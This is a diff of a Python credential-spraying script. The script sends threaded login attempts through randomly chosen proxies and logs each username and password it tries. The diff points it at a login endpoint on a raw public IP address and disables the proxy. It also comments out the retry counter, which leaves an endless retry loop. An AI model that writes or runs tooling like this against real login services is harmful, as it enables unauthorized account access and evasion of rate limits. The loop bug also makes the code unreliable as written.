@@ -11,9 +11,9 @@ print_lock = threading.Lock()
 
 # Set the correct target URL for the login endpoint on your backend
 # url = "http://localhost:5050/login"
-url = "https://www.google.com/webhp"
-# url = "http://34.224.51.201:5050/login"
-url = "https://reqbin.com/api/v1/ip"
+# url = "https://www.google.com/webhp"
+url = "http://34.224.51.201:5050/login"
+# url = "https://reqbin.com/api/v1/ip"
 # Define headers (optional)
 # headers = {
 #     'User-Agent': 'Mozilla/5.0',
@@ -78,12 +78,13 @@ def attempt_login(username, password, max_retries=3):
         proxy = get_random_proxy()
 
         try:
+            print(f"Post request with {username}:{password}:{proxy}...")
+
             # Adding a timeout of 10 seconds for the request
             # response = requests.post(url, json=data, proxies=proxy)
             response = requests.post(url, json=data, 
-                                     proxies=proxy, 
+                                    #  proxies=proxy, 
                                      headers=headers)
-
 
             # Check the HTTP status code for valid login response
             if response.status_code == 200:
@@ -110,7 +111,7 @@ def attempt_login(username, password, max_retries=3):
             print(f"[-] General error for {username}:{password} using proxy {proxy}: {e}, retrying...")
 
         # Retry by increasing the retry count
-        retries += 1
+        # retries += 1
         time.sleep(2)  # Optional: Add delay before retrying
 
 # Function to perform password spraying
